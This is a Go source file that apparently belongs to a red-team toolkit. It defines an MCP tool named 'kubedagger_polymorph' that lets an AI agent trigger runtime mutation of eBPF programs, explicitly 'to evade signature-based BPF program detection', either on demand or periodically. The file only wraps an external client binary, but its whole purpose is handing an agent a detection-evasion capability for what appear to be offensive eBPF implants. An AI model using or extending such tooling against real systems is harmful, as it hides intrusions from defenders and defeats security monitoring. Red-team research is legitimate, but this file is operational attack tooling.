package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type PolymorphInput struct {
	Action   string `json:"action"`
	Program  string `json:"program,omitempty"`
	Interval int    `json:"interval,omitempty"`
	Seed     string `json:"seed,omitempty"`
}

type PolymorphTool struct {
	exec executor.Executor
}

func NewPolymorph(exec executor.Executor) *PolymorphTool {
	return &PolymorphTool{exec: exec}
}

func (t *PolymorphTool) Name() string { return "kubedagger_polymorph" }

func (t *PolymorphTool) Description() string {
	return "Mutate loaded eBPF bytecode at runtime to evade signature-based BPF program detection. Applies semantic-preserving transformations (register renaming, instruction reordering, dead code insertion) to change program hash without altering behavior."
}

func (t *PolymorphTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["mutate", "status", "auto"],
				"description": "mutate: transform now; auto: periodic mutation; status: show current state"
			},
			"program": {
				"type": "string",
				"description": "Specific BPF program name to mutate (default: all kubedagger programs)"
			},
			"interval": {
				"type": "integer",
				"description": "Auto-mutation interval in seconds"
			},
			"seed": {
				"type": "string",
				"description": "Mutation seed for reproducible transforms"
			}
		},
		"required": ["action"]
	}`)
}

func (t *PolymorphTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PolymorphInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Program, "program"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Seed, "seed"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"polymorph", "--action", input.Action}
	if input.Program != "" {
		args = append(args, "--program", input.Program)
	}
	if input.Interval > 0 {
		args = append(args, "--interval", fmt.Sprintf("%d", input.Interval))
	}
	if input.Seed != "" {
		args = append(args, "--seed", input.Seed)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger polymorph failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Polymorph: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Mutation applied.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
